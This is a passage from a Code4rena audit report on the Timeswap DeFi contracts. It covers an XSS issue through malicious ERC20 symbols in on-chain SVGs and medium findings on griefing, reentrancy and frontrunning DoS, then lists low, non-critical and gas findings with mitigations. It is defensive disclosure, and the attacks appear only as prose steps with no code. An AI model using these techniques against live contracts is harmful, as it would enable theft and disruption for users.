on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.\n\nThe `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.\n\nThese set of circumstances leads to XSS when the SVG is loaded on any website.\n\n#### Proof of Concept\n\n1.  Hacker generates an ERC20 token with a symbol that contains malicious Javascript.\n2.  Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1.\n3.  When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol.\n4.  When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.\n\n\n#### Recommended Mitigation Steps\n\nCreating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.\n\nAs of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/131):**\n > We plan to add Safety String library.\n\n\n\n## [[M-06] `TimeswapPair.sol#mint()` Malicious user/attacker can mint new liquidity with an extremely small amount of `yIncrease` and malfunction the pair with the maturity](https://github.com/code-423n4/2022-01-timeswap-findings/issues/165)\n_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34>\n\nThe current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.\n\nHowever, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37>\n\nThe pair with the maturity will malfunction and can only be abandoned.\n\nA malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.\n\nIf the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.\n\n#### Recommendation\n\nConsider adding validation of minimal `state.y` for new liquidity.\n\nCan be `2**32 / 10000` for example.\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/165)**\n\n## [[M-07] no reentrancy guard on mint() function that has a callback ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/43)\n_Submitted by jayjonah8, also found by Fitraldys_\n\nIn CollateralizedDebt.sol, the mint() function calls \\_safeMint() which has a callback to the \"to\" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76>\n\n- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263>\n\n- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395>\n\n#### Recommended Mitigation Steps\n\nAdd a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/43)**\n\n## [[M-08] users might pay enormous amounts of gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/74)\n_Submitted by danb_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L141>\n\nwhen a user mints new liquidity, it the pair doesn't already exist, it deploys it.\n\ndeploying a new contract on ethereum is super expensive, especially when it's such a large contract like TimeswapPair, it can cost thousands of dollars.\n\n<https://medium.com/the-capital/how-much-does-it-cost-to-deploy-a-smart-contract-on-ethereum-11bcd64da1>\n\n#### Impact\n\nuser who try to mint liquidity on pair that doesn't exist will end up paying thousands of dollars.\n\n#### Recommended Mitigation Steps\n\nIf the pair doesn't exist, revert instead of deploying it.\ndeploying a new contract should be the user's choice, since it's so expensive.\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/74):**\n > We plan to have a better documentation to show this behavior.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/74#issuecomment-1021355163):**\n > Downgrading to med risk, this isn't an attack vector and is working as designed.  Funds aren't being lost or compromised in any way.\n> \n> The issue is with the design, which could be potentially improved.\n\n\n\n## [[M-09] DOS pay function](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86)\n_Submitted by egjlmn1_\n\nin the `pay()` function users repay their debt and in line 364:\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364>\nit decreases their debt.\n\nlets say a user wants to repay all his debt, he calls the `pay()` function with his full debt.\nan attacker can see it and frontrun to repay a single token for his debt (since it's likely the token uses 18 decimals, a single token is worth almost nothing)\nand since your solidity version is above 0.8.0 the line:\n`due.debt -= assetsIn[i];` will revert due to underflow\n\nThe attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\\$ (18 decimals) the attacker doesn't lose real money\n\n#### Impact\n\nA DoS on every user that  repay his full debt (or enough that the difference between his total debt to what he pays his negligible)\n\n#### Proof of Concept\n\nFrom solidity docs\n\nSince Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.\n\n#### Recommended Mitigation Steps\n\nif `assetsIn[i]` is bigger than `due.debt` set `assetsIn[i]=due.debt` and `due.debt=0`\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86):**\n > The convenience contract will implement how much asset to pay in.\n\n\n\n## [[M-10] Convenience contract fails to function if asset or collateral is an ERC20 token with fees](https://github.com/code-423n4/2022-01-timeswap-findings/issues/93)\n_Submitted by Ruhum_\n\nThere are ERC20 tokens that collect fees with each transfer. If the asset or collateral used in a pair is of that type, the Convenience contract fails to function. It always sends the flat amount specified in the function's parameter. If the token collects fees, the amount the Pair contract receives is less than it expects to get and reverts the transaction.\n\n#### Proof of Concept\n\nThe function used to trigger the callback function and verify the received value: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L50>\n\nConvenience contract's callback function uses the amount specified in `collateralIn` in the transfer function: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L535>\n\nIf the token collects fees, the value the Pair contract receives will be less than `collateralIn`. The following require statement will fail: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L52>\n\nThe same thing applies to all the other callback functions in the library.\n\nThis issue doesn't impact the Pair contract itself. Because of the safety checks for each callback, the contract always receives the amount it expects or the transaction is reverted. Meaning, the user has to adapt and cover the fees themselves. The convenience contract doesn't do that and thus always fails.\n\nThe only issue would be outgoing transfers. For example, if a borrower pays back their debt, the pair contract receives the correct amount. But, the borrower will receive less collateral because of the fees. Since there's no such check in those cases:\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374>\n\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/93):**\n > Hi what projects out there are using this fee mechanism in their transfer function? And what do you think is the mitigation for this? \n> \n > Almost all tokens don't have this fee implementation. If someone wants to utilize this, they can create their own convenience contract to interact with Timeswap V1 Core\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/93#issuecomment-1021384932):**\n > Would be worth documenting the behavior for fee on transfer tokens and also expected behavior for rebasing tokens as well.\n\n# Low Risk Findings (16)\n- [[L-01] Incorrect Q in comment](https://github.com/code-423n4/2022-01-timeswap-findings/issues/108) _Submitted by sirhashalot_\n- [[L-02] frontrun Temporary Dos attack](https://github.com/code-423n4/2022-01-timeswap-findings/issues/119) _Submitted by certora_\n- [[L-03] Missing input validation on array lengths (PayMath.sol)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/137) _Submitted by ye0lde_\n- [[L-04] no contract check in function createPair ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/145) _Submitted by Tomio_\n- [[L-05] `SquareRoot#sqrtUp()` Wrong implementation](https://github.com/code-423n4/2022-01-timeswap-findings/issues/176) _Submitted by WatchPug_\n- [[L-06] Named return issue](https://github.com/code-423n4/2022-01-timeswap-findings/issues/24) _Submitted by robee_\n- [[L-07] Core configuration variables aren't checked for operational mistakes on construction](https://github.com/code-423n4/2022-01-timeswap-findings/issues/34) _Submitted by hyh_\n- [[L-08] dangerous receive function](https://github.com/code-423n4/2022-01-timeswap-findings/issues/35) _Submitted by danb, also found by defsec_\n- [[L-09] No check that _factory and _weth are different addresses in constructor ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/45) _Submitted by jayjonah8_\n- [[L-10] Mint library uses wrong error code for max collateral check](https://github.com/code-423n4/2022-01-timeswap-findings/issues/56) _Submitted by hyh_\n- [[L-11] Wrong Safe implementation](https://github.com/code-423n4/2022-01-timeswap-findings/issues/69) _Submitted by 0x1f8b_\n- [[L-12] `pendingOwner` should be reset to `address(0)` after `acceptOwner()` is successfully called](https://github.com/code-423n4/2022-01-timeswap-findings/issues/83) _Submitted by Dravee, also found by cmichel, jah, p4st13r4, and pmerkleplant_\n- [[L-13] TimeswapConvenience params structure components are not validated before usage](https://github.com/code-423n4/2022-01-timeswap-findings/issues/88) _Submitted by hyh_\n- [[L-14] TimeswapPair's burn miss current pool liquidity check](https://github.com/code-423n4/2022-01-timeswap-findings/issues/94) _Submitted by hyh_\n- [[L-15] Borrowing of the whole asset supply can yield a low-level division revert](https://github.com/code-423n4/2022-01-timeswap-findings/issues/96) _Submitted by hyh_\n- [[L-16] TimeswapPair.pay doesn't check for non-existent debt owner](https://github.com/code-423n4/2022-01-timeswap-findings/issues/97) _Submitted by hyh_\n\n# Non-Critical Findings (11)\n- [[N-01] missing check  in constructor ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/10) _Submitted by jah_\n- [[N-02] messing with the dues ids for victim user ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/129) _Submitted by certora_\n- [[N-03] Outdated OpenZeppelin dependency](https://github.com/code-423n4/2022-01-timeswap-findings/issues/132) _Submitted by sirhashalot_\n- [[N-04] Typos](https://github.com/code-423n4/2022-01-timeswap-findings/issues/135) _Submitted by ye0lde_\n- [[N-05] Open TODOs](https://github.com/code-423n4/2022-01-timeswap-findings/issues/138) _Submitted by ye0lde, also found by cccz_\n- [[N-06] Liquidity constructor doesn't check that addresses are unique ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/39) _Submitted by jayjonah8_\n- [[N-07] Race condition on ERC20 approval](https://github.com/code-423n4/2022-01-timeswap-findings/issues/168) _Submitted by WatchPug_\n- [[N-08] Not verified function inputs of public / external functions](https://github.com/code-423n4/2022-01-timeswap-findings/issues/23) _Submitted by robee_\n- [[N-09] Improper Upper Bound Definition on the Fee](https://github.com/code-423n4/2022-01-timeswap-findings/issues/33) _Submitted by defsec, also found by Dravee_\n- [[N-10] Insurance.sol constructor doesn't check if addresses passed are unique ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/42) _Submitted by jayjonah8_\n- [[N-11] WETH9 example uses payable.transfer](https://github.com/code-423n4/2022-01-timeswap-findings/issues/98) _Submitted by hyh_\n\n# Gas Optimizations (43)\n- [[G-01] Less than 256 uints are not gas efficient](https://github.com/code-423n4/2022-01-timeswap-findings/issues/102) _Submitted by defsec_\n- [[G-02] Constructor Does Not Check for Zero Addresses for _factory and _weth](https://github.com/code-423n4/2022-01-timeswap-findings/issues/104) _Submitted by Meta0xNull, also found by Dravee_\n- [[G-03] Caching pair in timeswapPayCallback can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/106) _Submitted by p4st13r4_\n- [[G-04] Caching weth in timeswapMintCallback can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/107) _Submitted by p4st13r4_\n- [[G-05] Remove salt from createPair()](https://github.com/code-423n4/2022-01-timeswap-findings/issues/109) _Submitted by sirhashalot_\n- [[G-06] SafeTransfer library called from pay() function is not needed ](https://github.com/code-423n4/2022-01-timeswap-findings/issues/11) _Submitted by jayjonah8_\n- [[G-07] calculate a condition before the loop instead of calculating it in every iteration](https://github.com/code-423n4/2022-01-timeswap-findings/issues/126) _Submitted by OriDabush_\n- [[G-08] Gas: Break out of loop to save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/130) _Submitted by Dravee_\n- [[G-09] Use assignment not += in function mint (TimeswapPair.sol)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/136) _Submitted by ye0lde_\n- [[G-10] using storage instead of memory to declare struct variable inside the function](https://github.com/code-423n4/2022-01-timeswap-findings/issues/141) _Submitted by rfa_\n- [[G-11] Gas Optimization: Cache result of `BlockNumber.get()`](https://github.com/code-423n4/2022-01-timeswap-findings/issues/142) _Submitted by gzeon, also found by hyh_\n- [[G-12] can reduce gas in function createPair by replacing interface with address](https://github.com/code-423n4/2022-01-timeswap-findings/issues/144) _Submitted by Tomio_\n- [[G-13] Cache array length in for loops can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/151) _Submitted by WatchPug, also found by 0x0x0x, defsec, Dravee, PPrieditis, and robee_\n- [[G-14] Avoid unnecessary storage read can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/153) _Submitted by WatchPug_\n- [[G-15] `TimeswapPair.sol#mint()` Implementation can be simpler and save some gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/154) _Submitted by WatchPug_\n- [[G-16] `TimeswapPair.sol#mint()` Avoiding unnecessary code execution using checks can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/155) _Submitted by WatchPug, also found by csanuragjain, Dravee, gzeon, and PPrieditis_\n- [[G-17] Adding unchecked directive can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/156) _Submitted by WatchPug, also found by Dravee, and ye0lde_\n- [[G-18] `NFTTokenURIScaffold.sol#_isLtoStringTrimmedeapYear()` Check of `flag == 0` can be done earlier](https://github.com/code-423n4/2022-01-timeswap-findings/issues/157) _Submitted by WatchPug_\n- [[G-19] Unused imports](https://github.com/code-423n4/2022-01-timeswap-findings/issues/159) _Submitted by WatchPug_\n- [[G-20] Public functions to external](https://github.com/code-423n4/2022-01-timeswap-findings/issues/16) _Submitted by robee_\n- [[G-21] Remove unnecessary variables can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/161) _Submitted by WatchPug_\n- [[G-22] Inline unnecessary internal function can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/163) _Submitted by WatchPug_\n- [[G-23] Unnecessary checked arithmetic in for loops](https://github.com/code-423n4/2022-01-timeswap-findings/issues/170) _Submitted by WatchPug, also found by 0x1f8b, defsec, Dravee, OriDabush, and robee_\n- [[G-24] Use short reason strings can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/171) _Submitted by WatchPug, also found by defsec_\n- [[G-25] For uint `> 0` can be replaced with ` != 0` for gas optimization](https://github.com/code-423n4/2022-01-timeswap-findings/issues/172) _Submitted by 0x0x0x, also found by defsec, Dravee, fatima_naz, Jujic, OriDabush, rfa, WatchPug, and ye0lde_\n- [[G-26] `SafeCast.sol#toUint128()` Validation of input value can be done earlier to save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/173) _Submitted by WatchPug_\n- [[G-27] Simplify `SquareRoot#sqrt()` can save gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/174) _Submitted by WatchPug_\n- [[G-28] `10 ** 9` can be changed to `1e9` and save some gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/177) _Submitted by WatchPug_\n- [[G-29] Adding Unchecked Directive will Save Gas for BurnMath.sol#getAsset and BurnMath.sol#getCollateral functions](https://github.com/code-423n4/2022-01-timeswap-findings/issues/183) _Submitted by Rhynorater, also found by WatchPug_\n- [[G-30] Use `calldata` instead of `memory` for function parameters](https://github.com/code-423n4/2022-01-timeswap-findings/issues/32) _Submitted by defsec, also found by Dravee_\n- [[G-31] gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/36) _Submitted by danb_\n- [[G-32] waste of gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/37) _Submitted by danb_\n- [[G-33] A more efficient for loop index proceeding](https://github.com/code-423n4/2022-01-timeswap-findings/issues/49) _Submitted by Jujic_\n- [[G-34] Gas saving](https://github.com/code-423n4/2022-01-timeswap-findings/issues/51) _Submitted by 0x1f8b_\n- [[G-35] Use Custom Errors instead of Revert Strings to save Gas](https://github.com/code-423n4/2022-01-timeswap-findings/issues/61) _Submitted by Dravee_\n- [[G-36] \"constants\" expressions are expressions, not constants. Use \"immutable\" instead.](https://github.com/code-423n4/2022-01-timeswap-findings/issues/62) _Submitted by Dravee_\n- [[G-37] Gas optimization: Placement of require statements in `TimeswapPair:pay()`](https://github.com/code-423n4/2022-01-timeswap-findings/issues/80) _Submitted by Dravee_\n- [[G-38] Unused Named Returns](https://github.com/code-423n4/2022-01-timeswap-findings/issues/81) _Submitted by Dravee_\n- [[G-39] TimeswapPair.sol modifier lock: Switching between 1, 2 instead of 0, 1 is more gas efficient](https://github.com/code-423n4/2022-01-timeswap-findings/issues/87) _Submitted by bitbopper, also found by rfa and WatchPug_\n- [[G-40] more efficient gas usage by removing && operator](https://github.com/code-423n4/2022-01-timeswap-findings/issues/89) _Submitted by rfa_\n- [[G-41] WithdrawMath.getCollateral reads storage repetitively for the same state variables that don’t change](https://github.com/code-423n4/2022-01-timeswap-findings/issues/95) _Submitted by hyh_\n- [[G-42] subtract values in the if statement to avoid a useless operation](https://github.com/code-423n4/2022-01-timeswap-findings/issues/124) _Submitted by OriDabush, also found by 0x1f8b_\n- [[G-43] Gas: No need to initialize variables with default values](https://github.com/code-423n4/2022-01-timeswap-findings/issues/120) _Submitted by Dravee_\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}